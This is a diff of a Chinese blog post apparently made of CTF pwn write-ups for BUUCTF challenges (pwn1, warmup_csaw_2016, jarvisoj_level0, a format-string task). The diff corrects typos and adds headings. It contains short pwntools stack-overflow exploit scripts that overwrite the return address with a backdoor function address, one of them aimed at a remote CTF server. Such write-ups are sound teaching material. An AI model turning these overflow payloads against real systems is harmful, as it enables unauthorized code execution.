@@ -313,6 +313,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">❯ checksec pwn1<br>[*] <span class="hljs-string">&#x27;/home/p0ach1l/Desktop/pwning/pwn1&#x27;</span><br>    Arch:       amd64-<span class="hljs-number">64</span>-little<br>    RELRO:      Partial RELRO<br>    Stack:      No canary found<br>    NX:         NX unknown - GNU_STACK missing<br>    PIE:        No PIE (<span class="hljs-number">0x400000</span>)<br>    Stack:      Executable<br>    RWX:        Has RWX segments<br>    Stripped:   No<br></code></pre></td></tr></table></figure>
 
 <p>分析：（栈溢出）</p>
+<p>变量s离栈底为F（F转成10进制为15）</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412040040747.png" alt="image-20241204004011598"></p>
 <p>gets函数存在溢出点；</p>
 <p>存在后门函数fun()</p>
@@ -324,7 +325,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = process(<span class="hljs-string">&quot;./pwn1&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">15</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x0000000000401187</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041059037.png"></p>
-<p>写payload时，苏要需找到s所占的字节数：（双击是，进入）</p>
+<p>写payload时，需要需找到s所占的字节数：（双击s，进入）</p>
 <p>同时本题涉及栈不平衡：需要更改fun（）函数的地址</p>
 <p>f5运行：</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041103930.png" alt="image-20241204110359884"></p>
@@ -338,7 +339,8 @@
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041108692.png" alt="image-20241204110821632"></p>
 <p>输入cat flag:</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041109119.png" alt="image-20241204110915066"></p>
-<h3 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h3><h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041117170.png" alt="image-20241204111743080"></h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041118020.png" alt="image-20241204111808970"></p>
+<h3 id="3-warmup-csaw-2016"><a href="#3-warmup-csaw-2016" class="headerlink" title="3.warmup_csaw_2016"></a>3.warmup_csaw_2016</h3><p>本题思路：将ges函数溢出，控制到sub_40060Dsub_40060D函数</p>
+<h3 id="-1"><a href="#-1" class="headerlink" title></a><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041117170.png" alt="image-20241204111743080"></h3><p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041118020.png" alt="image-20241204111808970"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041122036.png" alt="image-20241204112229984"></p>
 <p>编写exp：</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">&quot;node5.buuoj.cn&quot;</span>,<span class="hljs-string">&quot;25172&quot;</span>)<br>payload = <span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x40</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">8</span>+p64(<span class="hljs-number">0x000000000040060D</span>)<br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>
@@ -363,7 +365,7 @@
 <p>但是看下面有个I,you</p>
 <figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">replace((std::string *)v3);<br></code></pre></td></tr></table></figure>
 
-<p>妹子不理解，但是通过网络查看wp，了解到是将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p>
+<p>妹子不理解，但是通过查看wp，了解到是将I换成了you，即一个字节转成了3个字节，这样就可以进行栈溢出了</p>
 <p>（又查看wp，发现可以先猜测一下，他是将I换成了you，然后跑一下，看看：</p>
 <p>{【打开终端，输入：.&#x2F;文件名】</p>
 <p>enter后显示： tell me something about yourself:</p>
@@ -377,10 +379,7 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041430248.png" alt="image-20241204143053201"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041423503.png" alt="image-20241204142330451"></p>
-<ol start="6">
-<li></li>
-</ol>
-<p>(本题涉及栈溢出，栈不平衡)</p>
+<h3 id="6-jarvisoj-level0"><a href="#6-jarvisoj-level0" class="headerlink" title="6.jarvisoj_level0"></a>6.jarvisoj_level0</h3><p>(本题涉及栈溢出，栈不平衡)</p>
 <p>首先查看main函数，没什么好看的，点开func（）</p>
 <p>发现read()函数</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041520500.png" alt="image-20241204152005447"></p>
@@ -393,10 +392,10 @@
 
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041519892.png" alt="image-20241204151901820"></p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041530974.png" alt="image-20241204153020897"></p>
-<ol start="7">
-<li></li>
-</ol>
+<h3 id="7-第五空间2019-决赛-PWN5"><a href="#7-第五空间2019-决赛-PWN5" class="headerlink" title="7.[第五空间2019 决赛]PWN5"></a>7.[第五空间2019 决赛]PWN5</h3><p>考察格式化字符串漏洞</p>
 <p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412041536582.png" alt="image-20241204153640514"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042041277.png" alt="image-20241204204135165"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/azjzfyuan/images/202412042050030.png" alt="image-20241204205037946"></p>
 ]]></content>
   </entry>
   <entry>
